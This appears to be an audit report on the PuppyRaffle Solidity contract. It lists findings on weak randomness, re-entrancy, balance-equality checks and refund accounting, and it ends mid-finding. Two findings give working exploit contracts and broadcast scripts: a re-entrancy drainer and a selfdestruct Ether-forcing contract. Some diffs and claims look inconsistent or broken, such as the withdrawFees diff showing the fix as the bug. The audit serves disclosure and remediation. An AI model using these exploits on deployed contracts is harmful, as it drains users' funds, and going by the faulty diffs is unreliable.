# 🦅Puppy Raffle

> Start Date: Oct 18th, 2023  
> End Date: Oct 25th, 2023

## Bug Leads

# Weak Randomness Implementation in `PuppyRaffle::selectWinner` Compromises Raffle Randomness

## Summary

The `PuppyRaffle::selectWinner` function relies on on-chain data to determine randomness, which compromises the quality of randomness in the game.

**Related GitHub Links:**

- [Code Location (Line 129)](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L129)
- [Code Location (Line 139)](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L139)

&nbsp;

## Vulnerability Details

The contract uses the `keccak256` hash of `msg.sender`, `block.timestamp`, and `block.difficulty` to determine the winner. Additionally, it calculates the rarity of the reward puppy using the `keccak256` hash of `msg.sender` and `block.difficulty`. This method is not truly random and can be predicted by users and manipulated by miners.

```diff
function selectWinner() external {
    // ...
-    uint256 winnerIndex = uint256(
-        keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
-    ) % players.length;
    // ...
-    uint256 rarity = uint256(
-        keccak256(abi.encodePacked(msg.sender, block.difficulty))
-    ) % 100;
    // ...
}
```

&nbsp;

## Proof of Concept

The provided test suite demonstrates the vulnerability's validity and severity. It consistently shows that the winner is predictable, given the known on-chain data, highlighting the lack of true randomness.

<details>

### How to Run the Test 
**Requirements** 
- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html). 
- Clone the project codebase into your local workspace.

**Step-by-step Guide to Run the Test**
1.  Ensure the above requirements are met.
2.  Execute the following command in your terminal to run the test:

```bash
forge test --match-test "testSelectWinner"
```

In the above test, you'll notice how the winner is always playerFour given the known on-chain data, which clearly reinforces the predictability of the winner.

</details>

&nbsp;

## Impact:

**Implications:**

1.  **Frontrunning**: The protocol is exposed to frontrunning. Since the transaction is public on the blockchain, a miner can calculate their chances of winning and enter the game at the exact time with a higher gas price, effectively frontrunning other potential winners.
    
2.  **Refund Manipulation**: Winners can calculate their chances of winning and the rarity of the reward puppy. This knowledge allows them to decide whether to get a refund at the last moment, potentially exploiting the system.
    

**Exploit Scenario:**

- John monitors the PuppyRaffle contract and observes Sarah sending a `selectWinner` transaction to the mempool.
- John realizes that under specific on-chain conditions, he has a higher probability of winning.
- He promptly sends a `selectWinner` transaction with a higher gas fee to frontrun Sarah and secures the raffle win.

&nbsp;

## Tools Used

- Foundry

&nbsp;

## Recommendations  
To address this vulnerability, consider using external sources of randomness via oracles and cryptographically verifying the outcome of the oracle on-chain, for instance, by implementing Chainlink VRF (Verifiable Random Function). This will significantly enhance the randomness and fairness of the game.

* * *

* * *

&nbsp;

# Re-Entrancy Vulnerability in `PuppyRaffle::refund` Could Lead to Permanent Fund Loss

**Related GitHub Links:**  
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L101-L103

&nbsp;

## Summary

The `PuppyRaffle::refund` function sends Ether to `msg.sender` before changing the state. This design can lead to a re-entrancy exposure.

&nbsp;

## Vulnerability Details

The `refund` function in `PuppyRaffle` interacts with arbitrary contracts without adhering to the check-effect-interaction pattern. This exposes the contract to a re-entrancy attack.

In this scenario, `msg.sender` can be a malicious contract with a function that repeatedly re-enters the `refund` function, causing the `PuppyRaffle` contract to send more Ether than the `entranceFee`.

```solidity
function refund(uint256 playerIndex) public {
    // ...

    // This line sends Ether before state change, making it susceptible to re-entrancy
    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

&nbsp;

## Proof of Concept

The provided scripts and test suite demonstrate the validity and severity of the vulnerability. These scripts exploit the re-entrancy issue in the `refund` function.

<details>

### How to Run the Scripts

**Requirements**

- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase to your local workspace.
- Copy the codes in the codebase below into their respective file and folder. Note the file names and path provided at the end of each code.
- Create a .env file in your root folder and add the required variables.
- The .env file should follow this format:

```env
RPC_URL=
PRIVATE_KEY=
ETHERSCAN_API_KEY=
```

**Step-by-step Guide to Run the PoC**

1.  Ensure the above requirements are installed.
2.  Run `source .env` to load .env variables into the terminal.
3.  Change `DeployPuppyRaffle.sol::duration` from "1 day" to "5 minutes"
4.  Change `DeployPuppyRaffle.sol::entranceFee` from "1e18" to "100 wei" and set it as PuppyRaffle constructor first parameter.
5.  Run the necessary command to deploy the following contracts.
6.  To deploy PuppyRaffle contract:

```bash
forge script script/DeployPuppyRaffle.sol:DeployPuppyRaffle --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vv
```

6.  To deploy AttackContract:

```bash
forge script script/DeployAttackContract.s.sol:DeployAttackContract --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vv
```

7.   Wait for five minutes, then run the command below to execute the exploit script:

```bash
forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $RPC_URL --broadcast -vvvvv
```

The preceding steps involved deploying the PuppyRaffle contract and subsequently deploying an AttackContract designed for exploiting the refund function in PuppyRaffle. Finally, a script is executed to initiate the attack.

Proof of Exploit:  
Please note the disparity in the logged data:

Initial Puppy Raffle balance before the exploit: 400  
Puppy Raffle balance after the exploit: 0  
Expected balance under normal conditions: 300

### Codebase

The code below consists of Foundry scripts that deploy the contract to a chosen network and interact with it through our exploit script.

**AttackContract**

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity "0.8.19";

interface IPuppyRaffle {
    function enterRaffle(address[] memory) external payable;

    function refund(uint256) external;

    function getActivePlayerIndex(address) external view returns (uint256);

    function entranceFee() external view returns (uint256);
}

contract AttackContract {
    IPuppyRaffle puppyRaffle;
    uint256 public entranceFee;
    uint256 public playerIndex;

    constructor(address _addr) {
        puppyRaffle = IPuppyRaffle(_addr);
    }

    function enterRaffle() external payable {
        /// @notice this is how players enter the raffle
        address[] memory newPlayers = new address[](4);
        newPlayers[0] = msg.sender;
        newPlayers[1] = address(this);
        newPlayers[2] = 0xcAcf4d840CB5D9a80e79b02e51186a966de757d9;
        newPlayers[3] = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);
    }

    function attack() external payable {
        /// @notice a way to get the index in the array
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        /// @notice start refunding attacks
        puppyRaffle.refund(playerIndex);
    }

    function getFee() external returns (uint256) {
        entranceFee = puppyRaffle.entranceFee();
        return entranceFee;
    }

    fallback() external payable {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(playerIndex);
        }
    }
}


// File name: AttackContract.sol
// File path: src/AttackContract.sol
```

**AttackContract deployment Script**  

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {AttackContract} from "../src/AttackContract.sol";

contract DeployAttackContract is Script {
    function run() external returns (AttackContract) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        address puppyAddr = 0xcf39816B5d1953E859d21dFa205bce2c1ab79f4B;

        vm.startBroadcast(deployerPrivateKey);
        AttackContract attack = new AttackContract(puppyAddr);
        vm.stopBroadcast();

        return (attack);
    }
}


// File name: DeployAttackContract.s.sol
// File path: script/DeployAttackContract.s.sol
```

**Trigger Script**  

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.19;

import {Script, console} from "forge-std/Script.sol";

interface IAttackContract {
    function attack() external payable;

    function getFee() external returns (uint256);

    function enterRaffle() external payable;
}

contract TriggerAttack is Script {
    IAttackContract public attack;
    uint256 puppyInitialBalance;
    uint256 puppyBalanceAfterAttack;
    uint256 expectNormalBalance;
    uint256 entranceFee;

    address attackAddr = 0xf31f177966061fF704B5B2418410eA45943F113a;
    address puppyRaffle = 0xcf39816B5d1953E859d21dFa205bce2c1ab79f4B;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        attack = IAttackContract(attackAddr);
        entranceFee = attack.getFee();

        attack.enterRaffle{value: 1_000_000_000 wei}();

        puppyInitialBalance = address(puppyRaffle).balance;

        attack.attack();

        puppyBalanceAfterAttack = address(puppyRaffle).balance;
        vm.stopBroadcast();

        console.log("entrance fee: ", entranceFee);
        console.log("puppy balance before attack: ", puppyInitialBalance);
        console.log("puppy balance after attack: ", puppyBalanceAfterAttack);
        console.log(
            "expect normal balance: ",
            puppyInitialBalance - entranceFee
        );
    }
}


// File name: TriggerAttack.s.sol
// File path: script/TriggerAttack.s.sol
```

</details>

&nbsp;

## Impact

**Exploit Scenario:**

1.  John enters the raffle.
2.  John decides to get a refund and exit the game.
3.  John initiates the refund function and gets credited.
4.  Before the contract updates John's status on the network, John repeatedly gets more refunds, potentially wiping out the contract balance.

&nbsp;

## Tools Used

- Foundry

&nbsp;

## Recommendations

Follow the check-interaction-effect pattern when implementing the `refund` function to avoid re-entrancy vulnerabilities. Here's an example of how to modify the function:

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

+    players[playerIndex] = address(0);
    
+    // Move the sendValue operation after the state change
+    payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}
``` 

By changing the order of operations, you ensure that the state is updated before sending Ether, reducing the risk of re-entrancy attacks.

* * *
* * *
# Incorrect Equality Check in `PuppyRaffle::withdrawFees` Leads to Permanent Fund Loss

**Related GitHub Link:**  
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L158

&nbsp;
## Summary

The `withdrawFees` function in `PuppyRaffle` uses incorrect equality checks, requiring that the contract's balance equals the total fees. This can potentially block fee withdrawal if additional Ether is sent to the contract outside of the raffle mechanism.

&nbsp;
## Vulnerability Details

The `withdrawFees` function in `PuppyRaffle` only allows withdrawal of `totalFees` if the contract's actual balance equals `totalFees`. This exposes the contract to a permanent fund loss.

In this scenario, if someone manages to send Ether into the contract through another means than `enterRaffle`, the `feeAddress` wouldn't be able to withdraw `totalFees`.

```diff
    function withdrawFees() external {
        require(
+            address(this).balance >= uint256(totalFees),
            "PuppyRaffle: There are currently players active!"
        );
    // ...
```

&nbsp;
## Proof of Concept

The provided scripts and test suite demonstrate the validity and severity of the vulnerability. 

<details>
### How to Run the Scripts

**Requirements**

- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase to your local workspace.
- Copy the codes in the codebase below into their respective file and folder. Note the file names and path provided at the end of each code.
- Create a .env file in your root folder and add the required variables.
- The .env file should follow this format:

```env
RPC_URL=
PRIVATE_KEY=
ETHERSCAN_API_KEY=
```

**Step-by-step Guide to Run the PoC**

1. Ensure the above requirements are met.
2. Run `source .env` to load .env variables into the terminal.
3. Change `DeployPuppyRaffle.sol::duration` from "1 day" to "5 minutes."
4. Change `DeployPuppyRaffle.sol::entranceFee` from "1e18" to "100 wei" and set it as the PuppyRaffle constructor's first parameter.
5. Run the necessary command to deploy the following contracts:
6. To deploy the PuppyRaffle contract:

```bash
forge script script/DeployPuppyRaffle.sol:DeployPuppyRaffle --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vv
```

7. To deploy the SuicideContract:

```bash
forge script script/DeploySuicideContract.s.sol:DeploySuicideContract --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vv
```

8. Wait for five minutes, then run the command below to execute the exploit script:

```bash
forge script script/TriggerSuicide.s.sol:TriggerSuicide --rpc-url $RPC_URL --broadcast -vvvvv
```

The preceding steps involve deploying the `PuppyRaffle` contract, deploying a `SuicideContract` designed to self-destruct and send its balance to `PuppyRaffle`, offsetting the internal accounting, and making the `withdrawFees` function inaccessible. Finally, a script is executed to initiate the attack.

**Proof of Exploit:**

Please note the logged data.

The raffle session is over, a winner is selected, but the owner (same as message sender) can't withdraw the `totalFees` from the contract, causing a crash.

### Codebase

The code below consists of Foundry scripts that deploy the contract to a chosen network and interact with it through our exploit script.

**SuicideContract**

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity "0.8.19";

interface IPuppyRaffle {
    function enterRaffle(address[] memory) external payable;

    function refund(uint256) external;

    function getActivePlayerIndex(address) external view returns (uint256);

    function entranceFee() external view returns (uint256);

    function totalFees() external view returns (uint256);

    function previousWinner() external view returns (address);

    function owner() external view returns (address);

    function selectWinner() external;

    function withdrawFees() external;
}

contract SuicideContract {
    IPuppyRaffle puppyRaffle;
    uint256 public entranceFee = 100 wei;
    address public previousWinner;
    address public owner;
    uint256 public totalFees;

    constructor(address _addr) payable {
        puppyRaffle = IPuppyRaffle(_addr);
    }

    function enterRaffle() external payable {
        /// @notice this is how players enter the raffle
        address[] memory newPlayers = new address[](4);
        newPlayers[0] = msg.sender;
        newPlayers[1] = address(this);
        newPlayers[2] = 0xcAcf4d840CB5D9a80e79b02e51186a966de757d9;
        newPlayers[3] = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);
    }

    function selectWinner() external {
        puppyRaffle.selectWinner();
    }

    function getPreviousWinner() external returns (address) {
        previousWinner = puppyRaffle.previousWinner();
        return previousWinner;
    }

    function getOwner() external returns (address) {
        owner = puppyRaffle.owner();
        return owner;
    }

    function getTotalFees() external returns (uint256) {
        totalFees = puppyRaffle.totalFees();
        return totalFees;
    }

    function attack() external {
        /// @notice contract self-destructs and forces a transfer of its balance to PuppyRaffle
        selfdestruct(payable(address(puppyRaffle)));
    }

    receive() external payable {}
}

// File

 name: SuicideContract.s.sol
// File path: script/DeploySuicideContract.s.sol
```

**SuicideContract Deployment Script**

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {SuicideContract} from "../src/SuicideContract.sol";

contract DeploySuicideContract is Script {
    function run() external returns (SuicideContract) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        address puppyAddr = 0xc2faAa7c42740c1eA9E4090835ee46aC8993B6Fb;

        vm.startBroadcast(deployerPrivateKey);
        SuicideContract attack = new SuicideContract{value: 2000}(puppyAddr);
        vm.stopBroadcast();

        return (attack);
    }
}

// File name: DeployAttackContract.s.sol
// File path: script/DeployAttackContract.s.sol
```

**Trigger Script**

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.19;

import {Script, console} from "forge-std/Script.sol";

interface ISuicideContract {
    function attack() external payable;

    function entranceFee() external returns (uint256);

    function getTotalFees() external returns (uint256);

    function enterRaffle() external payable;

    function getPreviousWinner() external returns (address);

    function getOwner() external returns (address);

    function selectWinner() external;
}

interface IPuppyRaffle {
    function withdrawFees() external;
}

contract TriggerSuicide is Script {
    ISuicideContract public attack;
    IPuppyRaffle public puppyRaffle;

    uint256 puppyInitialBalance;
    uint256 puppyBalanceAfterWinnerSelection;
    uint256 puppyBalanceAfterAttack;
    uint256 expectNormalBalance;
    uint256 entranceFee;
    uint256 initialTotalFees;
    uint256 totalFeesAfterWinnerSelection;
    uint256 totalFeesAfterAttack;

    address previousWinner;
    address owner;

    address attackAddr = 0x51207e2718Fd3c18b61D107326E53339B024EC5b;
    address puppyRaffleAddr = 0xc2faAa7c42740c1eA9E4090835ee46aC8993B6Fb;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address messageSender = vm.addr(privateKey);

        vm.startBroadcast(privateKey);

        attack = ISuicideContract(attackAddr);
        entranceFee = attack.entranceFee();

        puppyRaffle = IPuppyRaffle(puppyRaffleAddr);

        /// @notice owner of puppy raffle
        owner = attack.getOwner();

        /// @notice enter the raffle
        attack.enterRaffle{value: 1_000_000_000 wei}();

        /// @notice accounting before a winner is selected (end of raffle)
        puppyInitialBalance = address(puppyRaffle).balance;
        initialTotalFees = attack.getTotalFees();

        /// @notice select a winner
        attack.selectWinner();
        previousWinner = attack.getPreviousWinner();

        /// @notice accounting after a winner is selected
        puppyBalanceAfterWinnerSelection = address(puppyRaffle).balance;
        totalFeesAfterWinnerSelection = attack.getTotalFees();

        /// @notice suicide attack
        attack.attack();

        /// @notice accounting after the attack
        puppyBalanceAfterAttack = address(puppyRaffle).balance;
        totalFeesAfterAttack = attack.getTotalFees();

        vm.stopBroadcast();

        console.log("entrance fee: ", entranceFee);
        console.log("puppy balance before winner selection: ", puppyInitialBalance);
        console.log("total fees before winner selection: ", initialTotalFees);
        console.log("recent winner: ", previousWinner);
        console.log("puppy balance after winner selection: ", puppyBalanceAfterWinnerSelection);
        console.log("total fees after winner selection: ", totalFeesAfterWinnerSelection);
        console.log("puppy balance after attack: ", puppyBalanceAfterAttack);
        console.log("total fees after attack: ", totalFeesAfterAttack);
        console.log("owner: ", owner);
        console.log("message sender: ", messageSender);

        vm.startBroadcast(privateKey);
        /// This transaction is expected to revert with "PuppyRaffle: There are currently players active!"
        puppyRaffle.withdrawFees();
        vm.stopBroadcast();
    }
}

// File name: TriggerSuicide.s.sol
// File path: script/TriggerSuicide.s.sol
```
</details>

&nbsp;
## Impact
Loss of funds accrue to PuppyRaffle from raffle sessions.

**Exploit Scenario:**

1. A malicious actor (John) decides to compromise the network and prevent the protocol from withdrawing its revenue.
2. John decides to force extra Ether into the contract.
3. This prevents anyone from withdrawing the generated revenue.

## Tools Used

- Foundry

&nbsp;
## Recommendations

Avoid using `address(this).balance` for internal accounting. If you must use it, avoid strict equality checks for the Ether balance in a contract. Use the following approach:

```diff
function withdrawFees() external {
        require(
+            address(this).balance >= uint256(totalFees),
            "PuppyRaffle: There are currently players active!"
        );
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
``` 

***
***
# `PuppyRaffle::getActivePlayerIndex` Incorrectly Returns 0 for Non-Active Players

## Summary
The `PuppyRaffle::getActivePlayerIndex` function currently returns 0 when a player is not found in the `players` array. However, 0 is a valid index in the `players` array, which can lead to confusion or incorrect behavior.

**Related GitHub Links:**
- [GitHub Source](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L116)

## Vulnerability Details
The `getActivePlayerIndex` function returns 0 for non-active players, even though `players[0]` returns an active address when the raffle is in session.

```diff
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
-    return 0;
}
```

## Proof of Concept
The provided test suite demonstrates the validity and severity of this vulnerability.

<details>

### How to Run the Test
**Requirements**:
- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase into your local workspace.

**Step-by-step Guide to Run the Test**:
1. Ensure the above requirements are met.
2. Copy the test below and add it to `PuppyRaffleTest.t.sol` tests under the `getActivePlayerIndex` section.
3. Execute the following command in your terminal to run the test:

```bash
forge test --match-test "testReturnZeroForNonActivePlayerAndActivePlayers"
```

### Code
```solidity
function testReturnZeroForNonActivePlayerAndActivePlayers() public {
    address[] memory players = new address[](2);
    players[0] = playerOne;
    players[1] = playerTwo;
    puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

    /// @notice playerThree is not active and returns 0
    assertEq(puppyRaffle.getActivePlayerIndex(playerThree), 0);

    /// @notice playerOne is active and returns 0
    assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
}
```

</details>

## Impact
**Implications:**

1. **Poor UX**: This can lead to a poor user experience as the protocol provides incorrect information.
   
2. **Potential Manipulation**: Any function or system that relies on the integrity of the `getActivePlayerIndex` return value is compromised due to this vulnerability.

**Exploit Scenario:**

John requests the index of an address and assumes the player's activity status based on the return value. John makes a transaction based on that return value, but the result of his transaction is unexpected due to the incorrect assumption about the `getActivePlayerIndex` return value.

## Tools Used
- Foundry

## Recommendations
Instead of returning zero, it is recommended to revert the transaction with an error message that notifies the caller that the address isn't active.

```diff
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
+    revert("Player is not active!");
}
```


* * *
* * *
 
# Lack of Event Emission After Sensitive Actions

## Summary
This bug report highlights the absence of event emissions and the lack of indexed event address arguments in the events' parameters.

**Related GitHub Links:**
- [Constructor Issue](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L54C24-L55)
- [SelectWinner Issue](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L62)
- [FeeAddressChanged Issue](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L148-L150)

&nbsp;
## Vulnerability Details
### Constructor
In the constructor, it is important to emit appropriate events for any non-immutable variable set that emits an event when mutated elsewhere, such as `feeAddress`.

### selectWinner
The `selectWinner` function lacks events for critical state changes, including actions like `delete player`, setting `raffleStartTime = block.timestamp`, and updating `previousWinner` to the new `winner`.

### FeeAddressChanged Event
The `FeeAddressChanged` event emitted in the `changeFeeAddress` function should include indexing of event parameters of type address to facilitate off-chain tracking.

&nbsp;
## Impact
**Poor Developer Experience**: The absence of events or poorly designed events makes it challenging for blockchain applications and tools that monitor blockchain activities to keep track of the actions performed within the PuppyRaffle contract.

&nbsp;
## Recommendations
It is strongly recommended to emit events after every state change and to index event parameters of type address to improve transparency and off-chain tracking.

* * *
* * *
# Players Can Still Get Refund and Enter Raffle After Raffle Duration Elapses

## Summary
The `PuppyRaffle::enterRaffle` and `PuppyRaffle::refund` functions remain callable after the `raffleDuration` has elapsed, and a winner has not been chosen.

**Related GitHub Links:**
- https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L79-L81
- https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L96-L101C11

## Vulnerability Details
The `enterRaffle` and `refund` functions lack input validations that check whether `block.timestamp <= raffleStartTime + raffleDuration` before proceeding with the rest of the function code.

## Proof of Concept
The provided test suite demonstrates the validity and severity of this vulnerability.

<details>

### How to Run the Test
**Requirements**:
- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase into your local workspace.

**Step-by-step Guide to Run the Test**:
1. Ensure the above requirements are met.
2. Copy the test below and add it to `PuppyRaffleTest.t.sol` tests.
3. Paste these events before the `setUp` function in `PuppyRaffleTest.t.sol`.
```
    event RaffleEnter(address[] newPlayers);
    event RaffleRefunded(address player);
```
4. Execute the following command in your terminal to run the test:

```bash
forge test --match-test "testEnterRaffleAndRefundAfterRaffleDuration"
```

### Code
```solidity
function testEnterRaffleAndRefundAfterRaffleDuration()
    public
    playersEntered
{
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    ///@notice At this point, the raffle is over, but a winner hasn't been selected yet

    address[] memory players = new address[](1);
    address playerFive = address(5);
    players[0] = playerFive;

    ///@notice One new player is entered
    vm.expectEmit(true, false, false, false);
    emit RaffleEnter(players);
    puppyRaffle.enterRaffle{value: entranceFee}(players);

    ///@notice The winner is selected
    vm.prank(playerFive);
    vm.expectEmit(true, false, false, false);
    emit RaffleRefunded(playerFive);
    puppyRaffle.refund(4);
}
```

</details>

## Impact
**Implications:**
This vulnerability allows non-active players to enter the game after it has completed and potentially seize the winner's position if timed correctly. Additionally, players can avoid losing their stake by quickly obtaining a refund before a winner is selected.

**Exploit Scenario:**
- John participated in a raffle session and lost the round.
- But before the `selectWinner` transaction sent by Sarah is processed, John front-runs it with a refund transaction.
- He promptly exits the game before losing his funds.

## Tools Used
- Foundry

## Recommendations
Add a check that ensures `enterRaffle` and `refund` are only callable before the raffle duration elapses. This can be implemented as follows:

### enterRaffle
```diff
function enterRaffle(address[] memory newPlayers) public payable {
+    require(block.timestamp <= raffleStartTime + raffleDuration,"Raffle session end!");
    //...
}
```

### refund
```diff
function refund(uint256 playerIndex) public {
+    require(block.timestamp <= raffleStartTime + raffleDuration,"Raffle session end!");
    address playerAddress = players[playerIndex];
    //...
}
```

* * *
* * *

# Incorrect `players.length` in `PuppyRaffle::refund` Leads Excess Withdraws

## Summary
The `selectWinner` function relies on the `players.length` value to calculate `totalAmountCollected`. However, `players.length` can be inaccurate as it never decreases.

**Related GitHub Links:**
[GitHub Source](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L103C16-L103C16)

&nbsp;
## Vulnerability Details
When players get refunded, their address is simply replaced with an `address(0)`, causing `players.length` to remain the same. This affects the calculation of `totalAmountCollected` in the `selectWinner` function, which is used to calculate the winner's prize and the protocol's fee.

```diff
    function refund(uint256 playerIndex) public {
        //...
-        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

&nbsp;
## Proof of Concept
The provided test suite demonstrates the validity and severity of this vulnerability.

<details>

### How to Run the Test
**Requirements**:
- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase into your local workspace.

**Step-by-step Guide to Run the Test**:
1. Ensure the above requirements are met.
2. Copy the test below and add it to `PuppyRaffleTest.t.sol` tests.
3. Execute the following command in your terminal to run the test:

```bash
forge test --match-test "testAccountLogic"
```

### Code
```solidity
function testAccountLogic() public playersEntered {
        /// @notice playerOne gets a refund
        vm.prank(playerOne);
        puppyRaffle.refund(0);

        /// @notice playerTwo gets a refund
        vm.prank(playerTwo);
        puppyRaffle.refund(1);

        /// @notice playerThree gets a refund
        vm.prank(playerThree);
        puppyRaffle.refund(2);

        /// @notice raffle ends and the winner is selected
        vm.prank(address(this));
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Failed to send the prize pool to the winner");
        puppyRaffle.selectWinner();
    }

```

</details>

&nbsp;
## Impact
**Implications:**
If there are more than three players and everyone gets refunds, `selectWinner` is still callable because the `players.length` doesn't change. Also, there's a high probability of the PuppyRaffle balance not being able to cover the prize pool paid to the winner or the fee sent to the protocol, causing `selectWinner` to revert. Lastly, the more players that get refunded, the higher the chances of the contract selecting `address(0)` as the winner, which leads to loss of funds.

&nbsp;
## Tools Used
- Foundry

&nbsp;
## Recommendations
Instead of replacing the refunded player with `address(0)`, move the last player in the `players` array to the refunded player's position and then pop the array. This is what your function will look like:

```diff
    function refund(uint256 playerIndex) public {
				// ...
		
+        players[playerIndex] = players[players.length-1];
+        players.pop();
+        payable(msg.sender).sendValue(entranceFee);
		
        emit RaffleRefunded(playerAddress);
    }
```

***
***
# Empty Array Input in `PuppyRaffle::enterRaffle` Leads to a Denial of Service (DoS)

## Summary
The absence of sufficient input validation in the `enterRaffle` function allows it to receive an empty array, resulting in a denial of service when the function is invoked with an empty array.

**Related GitHub Links:**
[GitHub Source](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L86C23-L86C23)

&nbsp;
## Vulnerability Details
When the `enterRaffle` function is called with an empty array, it encounters an underflow issue when calculating `players.length - 1` within the for loop that checks for duplicate entries. This can lead to running out of gas while checking for duplicates.

```diff
    function enterRaffle(address[] memory newPlayers) public payable {
-       // No empty array check
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        // Check for duplicates
-        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }
```

&nbsp;
## Proof of Concept
The provided test demonstrates the validity and severity of this vulnerability.

<details>

### How to Run the Test
**Requirements**:
- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase into your local workspace.

**Step-by-step Guide to Run the Test**:
1. Ensure the above requirements are met.
2. Copy the test below and add it to `PuppyRaffleTest.t.sol` tests.
3. Execute the following command in your terminal to run the test:

```bash
forge test --match-test "testDoSVulnerability"
```

### Code
```solidity
    function testDoSVulnerability() public {
        address[] memory players;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }
```
Note that the test freezes.

</details>

&nbsp;
## Impact
**Functionality Disruption:** An empty array input to the `enterRaffle` function can lead to a denial of service, partially disabling the protocol.

&nbsp;
## Tools Used
- Foundry

&nbsp;
## Recommendations
Add a `require` statement to check for empty array inputs and revert if an empty array is provided. The modified function should look like this:

```diff
    function enterRaffle(address[] memory newPlayers) public payable {
+				require(newPlayers.length > 0, "Empty arrays not allowed!")
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
				// ...
    }
```

***
***
# Incorrect Equality in `PuppyRaffle::enterRaffle` Leads to Difficulty in Participation

## Summary
The use of strict equalities in `enterRaffle` may make it challenging for players to participate in the raffle.

**Related GitHub Links:**
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L80

&nbsp;
## Vulnerability Details
